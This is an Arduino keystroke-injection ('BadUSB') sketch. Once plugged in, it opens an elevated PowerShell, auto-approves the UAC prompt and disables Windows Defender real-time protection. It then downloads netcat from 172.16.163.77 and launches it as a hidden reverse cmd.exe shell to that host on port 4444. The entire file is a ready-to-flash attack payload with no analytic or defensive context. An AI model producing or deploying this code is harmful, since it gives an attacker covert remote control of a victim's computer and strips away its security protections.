#include "Keyboard.h"

void typeKey(int key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void runCommand(const char *cmd) {
  Keyboard.print(cmd);
  typeKey(KEY_RETURN);
  delay(500);
}

void setup() {
  Keyboard.begin();
  delay(1000); // Wait for system to recognize device

  // Run PowerShell as admin
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(300);
  runCommand("powershell Start-Process powershell -Verb runAs");
  delay(4000);

  // Approve UAC popup
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(1000);

  // Disable Defender real-time protection
  runCommand("powershell -ep bypass -w hidden -c \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
  delay(2000);

  // Create folder and download payload
  runCommand("cd \\ & mkdir sysdata & cd sysdata");
  runCommand("powershell -ep bypass -w hidden -c \"Invoke-WebRequest -Uri 'http://172.16.163.77/nc64.exe' -OutFile shell.exe\"");
  delay(4000);

  // Run shell in background
  runCommand("START /MIN shell.exe 172.16.163.77 4444 -e cmd.exe -d");
  delay(1000);
  runCommand("exit");

  Keyboard.end();
}

void loop() {}

       ¥
            